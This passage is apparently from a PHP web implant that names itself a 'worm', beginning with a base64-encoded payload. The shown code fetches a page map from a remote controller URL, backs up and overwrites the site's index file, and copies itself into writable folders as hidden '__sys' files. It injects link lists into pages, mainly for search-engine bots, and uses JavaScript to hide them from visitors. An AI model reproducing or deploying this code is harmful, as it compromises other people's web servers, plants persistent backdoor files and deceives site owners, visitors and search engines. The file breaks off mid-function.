AgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHBhZ2VzX3VybHMpewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfX3ZpYV9jb250ZW50ID0gIjx1bD4iIC4gaW1wbG9kZSgnJywgJHBhZ2VzX3VybHMpIC4gIjwvdWw+IjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkbGlua3Nfc291cmNlX2ZpbGVfcGF0aCwgJF9fdmlhX2NvbnRlbnQpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9fdmlhX2NvbnRlbnQgPSAkbGlua3Nfc291cmNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRfX3ZpYV9jb250ZW50KXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRsaW5rc19zb3VyY2VfZmlsZV9wYXRoLCAkX192aWFfY29udGVudCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlc19tYXAgPSBqc29uX2RlY29kZSgkcGFnZXNfbWFwX2pzb24sIHRydWUpOwogICAgICAgICAgICAgICAgICAgICAgICBpZihpc19hcnJheSgkcGFnZXNfbWFwKSAmJiAkcGFnZXNfbWFwKXsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZXNfYW1vdW50ID0gY291bnQoJHBhZ2VzX21hcCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkcGFnZXNfYW1vdW50ID49IDEwKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmFuZF9wYWdlc19rZXlzID0gYXJyYXlfcmFuZCgkcGFnZXNfbWFwLCAkcGFnZXNfYW1vdW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJhbmRfcGFnZXNfa2V5cyA9IGFycmF5X2tleXMoJHBhZ2VzX21hcCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VzX3VybHMgPSBhcnJheSgpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJHJhbmRfcGFnZXNfa2V5cyBhcyAkcGFnZV9rZXkpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfX3BhZ2UgPSAkcGFnZXNfbWFwWyRwYWdlX2tleV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJF9fcGFnZVsndXJsJ10pICYmIGlzc2V0KCRfX3BhZ2VbJ2FuY2hvciddKSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlc191cmxzW10gPSAiPGxpPjxhIGhyZWY9JyIgLiAkX19wYWdlWyd1cmwnXSAuICInPiIgLiAkX19wYWdlWydhbmNob3InXSAuICI8L2E+PC9saT4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkcGFnZXNfdXJscyl7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfX3ZpYV9jb250ZW50ID0gIjx1bD4iIC4gaW1wbG9kZSgnJywgJHBhZ2VzX3VybHMpIC4gIjwvdWw+IjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJGxpbmtzX3NvdXJjZV9maWxlX3BhdGgsICRfX3ZpYV9jb250ZW50KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJG9ubHlfYm90X2xpbmtzID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGlmKGlzc2V0KCR3ZWJzaXRlX2NvbmZpZ1snb25seV9ib3RfbGlua3MnXSkpewogICAgICAgICAgICAgICAgICAgICRvbmx5X2JvdF9saW5rcyA9IGlzX2Jvb2woJHdlYnNpdGVfY29uZmlnWydvbmx5X2JvdF9saW5rcyddKSA\/ICR3ZWJzaXRlX2NvbmZpZ1snb25seV9ib3RfbGlua3MnXSA6ICgkd2Vic2l0ZV9jb25maWdbJ29ubHlfYm90X2xpbmtzJ10gPT0gMSA\/IHRydWUgOiBmYWxzZSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGhpZGVfbGlua3NfdHlwZSA9IG51bGw7CiAgICAgICAgICAgICAgICBpZihpc3NldCgkd2Vic2l0ZV9jb25maWdbJ2hpZGVfbGlua3NfdHlwZSddKSl7CiAgICAgICAgICAgICAgICAgICAgJGhpZGVfbGlua3NfdHlwZSA9ICR3ZWJzaXRlX2NvbmZpZ1snaGlkZV9saW5rc190eXBlJ107CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCgoJG9ubHlfYm90X2xpbmtzICYmICRpc19ib3QpIHx8ICEkb25seV9ib3RfbGlua3MpICYmICRfX3ZpYV9jb250ZW50ICYmIGlzX3N0cmluZygkX192aWFfY29udGVudCkpIHsKCiAgICAgICAgICAgICAgICAgICAgc3dpdGNoKCRoaWRlX2xpbmtzX3R5cGUpewogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICdqcyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkX192aWFfanNfc2NyaXB0ID0gIjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz52YXIgZSRoYXNoID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyRoYXNoJyk7ZSRoYXNoLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7ZSRoYXNoLnN0eWxlLnZpc2liaWxpdHkgPSAnaGlkZGVuJzs8L3NjcmlwdD4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9fdmlhX2NvbnRlbnQgPSAiPGRpdiBpZD0nJGhhc2gnPnskX192aWFfY29udGVudH17JF9fdmlhX2pzX3NjcmlwdH08L2Rpdj4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkX2NvbnRlbnQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgICR2aWFfZ2V0X3BhZ2VfY29udGVudCA9IGZhbHNlOwoKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiB2aWFfZ2V0X3BhZ2VfY29udGVudCgpewoKICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsICR2aWFfZ2V0X3BhZ2VfY29udGVudDsKICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsICRfY29udGVudDsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCR2aWFfZ2V0X3BhZ2VfY29udGVudCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICR2aWFfZ2V0X3BhZ2VfY29udGVudCA9IHRydWU7CgogICAgICAgICAgICAgICAgICAgICAgICAkX2NvbnRlbnQgPSBvYl9nZXRfY29udGVudHMoKTsKICAgICAgICAgICAgICAgICAgICAgICAgb2JfY2xlYW4oKTsKCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICByZWdpc3Rlcl9zaHV0ZG93bl9mdW5jdGlvbigidmlhX2dldF9wYWdlX2NvbnRlbnQiKTsKCiAgICAgICAgICAgICAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICAgICAgICAgICAgICByZXF1aXJlKCRpbmNsdWRlX2ZpbGVfcGF0aCk7CiAgICAgICAgICAgICAgICAgICAgdmlhX2dldF9wYWdlX2NvbnRlbnQoKTsKCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKCiAgICAgICAgICAgICAgICAgICAgICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgbGlieG1sX3VzZV9pbnRlcm5hbF9lcnJvcnModHJ1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRkb20tPmxvYWRIVE1MKCRfY29udGVudCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnhtbF9jbGVhcl9lcnJvcnMoKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICR0YWdzID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncCcsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGl2JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzcGFuJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0YWJsZScsCiAgICAgICAgICAgICAgICAgICAgICAgICk7CgogICAgICAgICAgICAgICAgICAgICAgICAkRE9NRWxlbWVudCA9IG51bGw7CgogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0YWdzIGFzICR0YWcpewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRET01Ob2RlTGlzdCA9ICRkb20tPmdldEVsZW1lbnRzQnlUYWdOYW1lKCR0YWcpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRET01Ob2RlTGlzdC0+bGVuZ3RoID4gMCl7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtSW5kZXggPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRET01Ob2RlTGlzdC0+bGVuZ3RoID4gMSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtSW5kZXggPSBmbG9vcigkRE9NTm9kZUxpc3QtPmxlbmd0aCAvIDIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJERPTUVsZW1lbnQgPSAkRE9NTm9kZUxpc3QtPml0ZW0oJGl0ZW1JbmRleCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJERPTUVsZW1lbnQgaW5zdGFuY2VvZiBET01FbGVtZW50KXsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZnJhZ21lbnQgPSAkZG9tLT5jcmVhdGVEb2N1bWVudEZyYWdtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZnJhZ21lbnQtPmFwcGVuZFhNTCgkX192aWFfY29udGVudCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGZyYWdtZW50LT5jaGlsZE5vZGVzLT5sZW5ndGggPD0gMCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQHVubGluaygkbGlua3Nfc291cmNlX2ZpbGVfcGF0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IFxFeGNlcHRpb24oJ0ludmFsaWQgdmlhIGNvbnRlbnQnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRE9NRWxlbWVudC0+cGFyZW50Tm9kZS0+aW5zZXJ0QmVmb3JlKCRmcmFnbWVudCwgJERPTUVsZW1lbnQpOwoKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBcRXhjZXB0aW9uKCdET00gZWxlbWVudCBub3QgZm91bmQnKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAkZG9tLT5zYXZlSFRNTCgpOwoKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoKEV4Y2VwdGlvbiAkZSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgJGRlbGltaXRlciA9ICI8L2JvZHk+IjsKCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlX3BhcnRzID0gZXhwbG9kZSgkZGVsaW1pdGVyLCAkX2NvbnRlbnQpOwogICAgICAgICAgICAgICAgICAgICAgICAkcGFnZV9wYXJ0c1swXSAuPSAkX192aWFfY29udGVudCAuICRkZWxpbWl0ZXI7CgogICAgICAgICAgICAgICAgICAgICAgICAkX2NvbnRlbnQgPSBpbXBsb2RlKCIiLCAkcGFnZV9wYXJ0cyk7CgogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICRfY29udGVudDsKCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBleGl0KCk7CgogICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgaW5jbHVkZV9vbmNlKCRpbmNsdWRlX2ZpbGVfcGF0aCk7CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgfQoKfQoKaW5jbHVkZV9vbmNlKCRpbmNsdWRlX2ZpbGVfcGF0aCk7',\n    );\n\n    \/**\n     * @var array\n     *\/\n    public static $ignoreWormFilesPaths = array();\n\n    \/**\n     * @param null $host\n     * @param null $rootDir\n     *\/\n    public function __construct($host = null, $rootDir = null)\n    {\n\n        $this->host = $host;\n        $this->rootDir = $rootDir;\n\n    }\n\n    \/**\n     * @throws Exception\n     *\/\n    public function start(){\n\n        if($this->host && $this->host != self::getRequestHost()){\n\n            if(!preg_match('\/^(?:[-A-Za-z0-9]+\\.)+[A-Za-z]{2,6}$\/', $this->getHost())){\n                throw new Exception('Invalid host ' . $this->getHost());\n            }\n\n            $url = $this->getWebsiteUlr();\n            $validationData = $this->isValidUrl($url);\n\n            if($validationData){\n\n                if($validationData['redirectUrl']){\n                    $url = $validationData['redirectUrl'];\n                }\n\n                $this->setHost(parse_url($url, PHP_URL_HOST));\n\n            }\n\n        }\n\n        $files = $this->getRootDirFiles();\n\n        foreach ($files as $filePath) {\n\n            $file = new SplFileInfo($filePath);\n\n            switch ($file->getFilename()) {\n                \/* .htaccess *\/\n                case '.htaccess':\n                    $this->htaccessFile = $file;\n                    break;\n                \/* PHP files *\/\n                case 'index.php':\n                case 'app.php':\n                case 'home.php':\n                    \/* HTML files *\/\n                case 'index.htm':\n                case 'index.html':\n                case 'home.html':\n                    $this->possibleIndexes[$file->getFilename()] = array(\n                        'rate' => $file->getFilename() == 'index.php' ? 2 : 1,\n                        'file' => $file,\n                    );\n                    break;\n            }\n\n        }\n\n        \/* Check environment DirectoryIndex variable *\/\n        if (dirname(__FILE__) == $this->getRootDir()) {\n\n            $DirectoryIndex = getenv('DirectoryIndex');\n\n            if ($DirectoryIndex) {\n\n                if (isset($this->possibleIndexes[$DirectoryIndex])) {\n\n                    $this->possibleIndexes[$DirectoryIndex]['rate'] = $this->possibleIndexes[$DirectoryIndex]['rate'] + 2;\n\n                }\n\n            }\n\n        }\n\n        self::$ignoreWormFilesPaths[] = $this->getRootDir();\n        $indexFilePath = ($this->getRootDir()) . DIRECTORY_SEPARATOR . 'index.php';\n        if(@is_file($indexFilePath)){\n\n            $indexFileContent = @file_get_contents($indexFilePath);\n\n            $variableNames = array(\n                'copy_file_name',\n                'daddy_url',\n                'link_daddy_url',\n                'website_config_file',\n                'pages_map_file',\n                'pages_sources_path',\n                'links_sources_path',\n                'static_files_path',\n                'static_files_url_prefix',\n            );\n\n            preg_match_all(\"\/\\\\$(\" . implode('|', $variableNames) . \")\\\\s+=\\\\s+['|\\\"](.*)['|\\\"];\/\", $indexFileContent, $matches);\n\n            $variables = array();\n            foreach($variableNames as $variableName){\n\n                if(isset($matches[1])){\n\n                    $variableIndex = array_search($variableName, $matches[1]);\n                    $variables[$variableName] = ($variableIndex !== null ? $matches[2][$variableIndex] : null);\n\n                }\n\n            }\n\n            if(isset($variables['pages_map_file'])){\n\n                $dir = dirname($variables['pages_map_file']);\n\n                $hasHiddenDir = false;\n                foreach(explode(DIRECTORY_SEPARATOR, $dir) as $basename){\n                    if(strpos($basename, '.') === 0){\n                        $hasHiddenDir = true;\n                        break;\n                    }\n                }\n\n                if(@is_dir($dir) && $dir != $this->getRootDir() && !$hasHiddenDir){\n                    $this->wormFilesPath = realpath($dir);\n                }\n\n            }\n\n            foreach($variables as $name => $value){\n\n                switch($name){\n                    case 'website_config_file':\n                    case 'pages_sources_path':\n                    case 'links_sources_path':\n                    case 'static_files_path':\n\n                        if($value){\n\n                            if(@is_dir($value) || @is_file($value)){\n\n                                $file = new SplFileInfo($value);\n                                if(!$file->isWritable() || !$file->isReadable()){\n\n                                    if($this->wormFilesPath){\n                                        self::$ignoreWormFilesPaths[] = realpath($this->wormFilesPath);\n                                    }\n\n                                    $this->wormFilesPath = null;\n                                }\n\n                            }\n\n                        }\n\n                        break;\n                }\n\n            }\n\n        }\n\n        $this->analyzeHtaccessFile();\n        $this->analyzePossibleIndexFiles();\n\n    }\n\n    \/**\n     * @return string\n     *\/\n    public function getWormFilesPath(){\n\n        if(!$this->wormFilesPath){\n\n            $ignore_dirs = array(\n                'tmp',\n                'not use',\n                'non_contactless',\n                'wp-snapshots',\n                'cache',\n                'cgi-bin',\n                '__pages_sources',\n                '__links_sources',\n                '_static_files',\n            );\n\n            $wormFilesPath = $this->getRootDir();\n            $paths = @__via_get_dir_file_paths($this->getRootDir());\n\n            foreach($paths as $path){\n\n                $file = new SplFileInfo($path);\n\n                if (in_array($file->getFilename(), $ignore_dirs) || strpos($file->getFilename(), '.') === 0) {\n                    continue;\n                };\n\n                if(@is_dir($path) && @is_writable($path)){\n\n                    if(!in_array($path, self::$ignoreWormFilesPaths)){\n\n                        $wormFilesPath = $path;\n\n                        $paths2 = @__via_get_dir_file_paths($path);\n\n                        foreach($paths2 as $path2){\n\n                            $file2 = new SplFileInfo($path2);\n\n                            if (in_array($file2->getFilename(), $ignore_dirs) || strpos($file->getFilename(), '.') === 0) {\n                                continue;\n                            };\n\n                            if(!in_array($path2, self::$ignoreWormFilesPaths)){\n\n                                if(@is_dir($path2) && @is_writable($path2)){\n\n                                    $wormFilesPath = $path2;\n                                    break;\n\n                                }\n\n                            }\n\n                        }\n\n                        break;\n\n                    }\n\n                }\n\n            };\n\n            if(!$wormFilesPath){\n                $wormFilesPath = $this->getRootDir();\n            }\n\n            $this->wormFilesPath = ($wormFilesPath);\n\n        }\n\n        return $this->wormFilesPath;\n\n    }\n\n    public function hideWormFiles(){\n\n        $wormSource = json_encode(@file_get_contents(__FILE__));\n        $this->updateWorm($wormSource);\n\n    }\n\n    \/**\n     * @return SplFileInfo\n     *\/\n    public function getStaticFilesPath(){\n\n        $path = ($this->getWormFilesPath()) . DIRECTORY_SEPARATOR . '_static_files';\n        if(!@is_dir($path)){\n            @mkdir($path);\n        }\n        return $path;\n\n    }\n\n    \/**\n     * @return string\n     *\/\n    public function getStaticFilesUrlPrefix(){\n\n        $path = $this->getStaticFilesPath();\n        return $this->buildUrl($path);\n\n    }\n\n    \/**\n     * @return SplFileInfo\n     *\/\n    public function getWormSourceFile(){\n\n        $fileName = $this->getWormFilesPath() . DIRECTORY_SEPARATOR . '__sys_source';\n        $file = new SplFileInfo($fileName);\n        return $file;\n\n    }\n\n    \/**\n     * @param $encodedString\n     * @return int\n     *\/\n    public function updateWormSource($encodedString){\n\n        $file = $this->getWormSourceFile();\n\n        $path = ($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n        $bytes = @__via_file_put_contents($path, $encodedString);\n\n        return $bytes ? $path : null;\n\n    }\n\n    \/**\n     * @return mixed\n     *\/\n    public function getPagesSourcesPath(){\n        $path = $this->getWormFilesPath() . DIRECTORY_SEPARATOR . '__pages_sources';\n        if(!@is_dir($path)){\n            @mkdir($path);\n        }\n        return $path;\n    }\n\n    \/**\n     * @return mixed\n     *\/\n    public function getLinksSourcesPath(){\n        $path = $this->getWormFilesPath() . DIRECTORY_SEPARATOR . '__links_sources';\n        if(!@is_dir($path)){\n            @mkdir($path);\n        }\n        return $path;\n    }\n\n    \/**\n     * @return string\n     *\/\n    public function getPagesMapFilePath(){\n        return $this->getWormFilesPath() . DIRECTORY_SEPARATOR . '__pages_map';\n    }\n\n    \/**\n     * @return SplFileInfo\n     *\/\n    public function getPagesMapFile(){\n        $fileName = $this->getPagesMapFilePath();\n        $file = new SplFileInfo($fileName);\n        return $file;\n    }\n\n    \/**\n     * @return bool|mixed\n     *\/\n    public function getPagesMap(){\n        $file = $this->getPagesMapFile();\n        if($file->isFile()){\n            return json_decode(@file_get_contents(($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename()), true);\n        } else {\n            return false;\n        }\n    }\n\n    \/**\n     * @return bool|string\n     *\/\n    public function updatePagesMap(){\n\n        $pages_map = @__via_file_get_contents_curl(__via_get_daddy_url() . '\/website-pages-map?domain=' . urlencode($this->getHost()));\n\n        if($pages_map){\n\n            $file = $this->getPagesMapFile();\n\n            $path = ($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n            $bytes = @__via_file_put_contents($path, $pages_map);\n\n            return $bytes ? $bytes : false;\n\n        } else {\n\n            return false;\n\n        }\n\n    }\n\n\n    \/**\n     * @return SplFileInfo\n     *\/\n    public function getWormBlackHoleFile(){\n        $fileName = ($this->getWormSourceFile()->getPath()) . DIRECTORY_SEPARATOR . '__sys.php';\n        $file = new SplFileInfo($fileName);\n        return $file;\n    }\n\n    \/**\n     * @return bool|int\n     *\/\n    public function updateWormBlackHole(){\n\n        $file = $this->getWormSourceFile();\n        if($file->isFile()){\n\n            $blackHoleFile = $this->getWormBlackHoleFile();\n            $path = ($blackHoleFile->getPath()) . DIRECTORY_SEPARATOR . $blackHoleFile->getFilename();\n            $__path = ($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n            $bytes = @__via_file_put_contents($path, json_decode(@file_get_contents($__path), true));\n\n            return $bytes ? $path : null;\n\n        } else {\n\n            return null;\n\n        }\n\n    }\n\n    \/**\n     * @return string\n     *\/\n    public function getWebsiteConfigFilePath(){\n        return $this->getWormFilesPath() . DIRECTORY_SEPARATOR . '__website_config';\n    }\n\n    \/**\n     * @return SplFileInfo\n     *\/\n    public function getWebsiteConfigFile(){\n\n        $fileName = $this->getWebsiteConfigFilePath();\n        $file = new SplFileInfo($fileName);\n        return $file;\n\n    }\n\n    \/**\n     * @return bool|mixed\n     *\/\n    public function getWebsiteConfig(){\n        $file = $this->getWebsiteConfigFile();\n        if($file->isFile()){\n            $path = ($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n            return json_decode(@file_get_contents($path), true);\n        } else {\n            return false;\n        }\n    }\n\n    \/**\n     * @param array $config\n     * @return array\n     *\/\n    public function setWebsiteConfig(array $config){\n        $file = $this->getWebsiteConfigFile();\n        $current_config = $this->getWebsiteConfig() ? $this->getWebsiteConfig() : array();\n        $config = array_merge($current_config, $config);\n        @__via_file_put_contents(($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename(), json_encode($config));\n        return $config;\n    }\n\n    \/**\n     * @param $encodedString\n     * @return array\n     *\/\n    public function updateWorm($encodedString){\n\n        $source_path = $this->updateWormSource($encodedString);\n        $worm_path = $this->updateWormBlackHole();\n\n        return array(\n            'source_path' => $source_path,\n            'worm_path' => $worm_path,\n            'worm_url' => $this->getWormUrl(),\n        );\n\n    }\n\n    \/**\n     * @param $path\n     * @return bool\n     *\/\n    private function validMainFilePath($path){\n\n        $exists = @file_exists($path);\n        $writable = @is_writable($path);\n        $changed = false;\n\n        if($exists && $writable && strpos(@file_get_contents($path), '$__via_copy_file_name') !== false){\n            $changed = true;\n        }\n\n        if($exists && $writable && $changed){\n            $valid = true;\n        } else {\n            $valid = !$exists;\n        }\n\n        return $valid;\n\n    }\n\n    \/**\n     * @param $dirPath\n     * @return null|string\n     *\/\n    protected function findDirWebsiteSourcePath($dirPath){\n\n        $websiteSourcePath = null;\n        $paths = @__via_get_dir_file_paths($dirPath);\n\n        foreach($paths as $path){\n\n            $file = new SplFileInfo($path);\n\n            if(@is_dir($path)){\n\n                $websiteSourcePath = $this->findDirWebsiteSourcePath($path);\n                if($websiteSourcePath){\n                    break;\n                }\n\n            } else {\n\n                if($file->getFilename() == '__website_source'){\n\n                    $content = @file_get_contents($path);\n                    if($content && $content != 'null' && !$content != 'false'){\n                        $websiteSourcePath = $path;\n                        break;\n                    }\n\n                }\n\n            }\n\n        };\n\n        return $websiteSourcePath;\n\n    }\n\n    \/**\n     * @return null|string\n     *\/\n    private function findWebsiteSourcePath(){\n        return $this->findDirWebsiteSourcePath($this->getRootDir());\n    }\n\n    \/**\n     * @param string $indexSourceKey\n     * @throws Exception\n     *\/\n    public function changeIndexFile($indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES)\n    {\n\n        $indexFile = $this->getIndexFile();\n\n        if ($indexFile instanceof SplFileInfo) {\n\n            $copyFilePrefixExtension = '_old_';\n            $extension = pathinfo($indexFile->getFilename(), PATHINFO_EXTENSION);\n\n            $copyFileName = str_replace('.' . $extension, '', $indexFile->getFilename()) . $copyFilePrefixExtension . '.' . $extension;\n            $copyFileRealPath = ($indexFile->getPath()) . DIRECTORY_SEPARATOR . $copyFileName;\n\n            $websiteSource = null;\n            $websiteSourceFileName = '__website_source';\n            $websiteSourceFilePath = $this->getWormFilesPath() . DIRECTORY_SEPARATOR . $websiteSourceFileName;\n\n            $oldFilePath = null;\n            $oldFileNames = array(\n                'index._old_.html',\n                'index_old_.html',\n                'home._old_.html',\n                'home_old_.html',\n                'index._old_.htm',\n                'index_old_.htm',\n                'index._old_.php',\n                'index_old_.php',\n            );\n\n            foreach($oldFileNames as $oldFileName){\n                if(@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . $oldFileName)) {\n                    $oldFilePath = $indexFile->getPath() . DIRECTORY_SEPARATOR . $oldFileName;\n                    break;\n                }\n            }\n\n            if(!$oldFilePath){\n\n                if(@file_exists($copyFileRealPath)){\n                    $oldFilePath = $copyFileRealPath;\n                } else {\n                    $oldFilePath = $indexFile->getPath() . DIRECTORY_SEPARATOR . $indexFile->getFilename();\n                }\n\n            }\n\n            if(@file_exists($oldFilePath)){\n\n                $websiteSource = @file_get_contents($oldFilePath);\n                if($websiteSource){\n                    @__via_file_put_contents($websiteSourceFilePath, base64_encode($websiteSource));\n                }\n\n            } else {\n\n                if(!@file_exists($websiteSourceFilePath)){\n\n                    $websiteSourceContent = @file_get_contents($websiteSourceFilePath);\n                    if($websiteSourceContent && $websiteSourceContent != 'null' && $websiteSourceContent != 'false'){\n\n                        if(base64_decode($websiteSourceContent, true)){\n                            $websiteSource = base64_decode($websiteSourceContent);\n                        } else {\n                            $websiteSource = json_decode($websiteSourceContent, true);\n                        }\n\n                    }\n\n                }\n\n            }\n\n            $indexFileName = $indexFile->getFilename();\n            if ($extension == 'html' || $extension == 'htm') {\n                $indexFileName = 'index.php';\n            }\n\n            $mainFilePath = $indexFile->getPath() . DIRECTORY_SEPARATOR . $indexFileName;\n\n            if(@file_exists($mainFilePath) && !@is_writable($mainFilePath)){\n                if(!@chmod($mainFilePath, 0755)){\n                    @unlink($mainFilePath);\n                }\n            }\n\n            $isValidMainFilePath = (!@file_exists($mainFilePath) || (@file_exists($mainFilePath) && @is_writable($mainFilePath)));\n\n            if($isValidMainFilePath){\n\n                if(!$websiteSource || ($websiteSource && ($websiteSource == 'null' || $websiteSource == 'false'))){\n\n                    $prevWebsiteSourceFilePath = $this->findWebsiteSourcePath();\n                    if($prevWebsiteSourceFilePath){\n\n                        $prevWebsiteSourceContent = @file_get_contents($prevWebsiteSourceFilePath);\n                        if($prevWebsiteSourceContent && $prevWebsiteSourceContent != 'null' && $prevWebsiteSourceContent != 'false'){\n\n                            if(base64_decode($prevWebsiteSourceContent, true)){\n                                $websiteSource = base64_decode($prevWebsiteSourceContent);\n                            } else {\n                                $websiteSource = json_decode($prevWebsiteSourceContent, true);\n                            }\n\n                            @__via_file_put_contents($websiteSourceFilePath, base64_encode($websiteSource));\n\n                        }\n\n                    }\n\n                }\n\n                @__via_file_put_contents($copyFileRealPath, $websiteSource);\n\n            } else {\n\n                $mainFilePath = null;\n\n            }\n\n            if(!$mainFilePath){\n\n                if(!@file_exists($copyFileRealPath)){\n                    $copyFileName = $indexFile->getFilename();\n                }\n\n                $mainFileNames = array('launcher.php', 'starter.php');\n                $checkMainFilePath = null;\n\n                foreach($mainFileNames as $checkMainFileName){\n\n                    $checkMainFilePath = ($indexFile->getPath() . DIRECTORY_SEPARATOR . $checkMainFileName);\n                    if($this->validMainFilePath($checkMainFilePath)){\n                        break;\n                    } else {\n                        $checkMainFilePath = null;\n                    }\n\n                }\n\n                if(!$checkMainFilePath){\n\n                    $i = 0;\n                    do {\n\n                        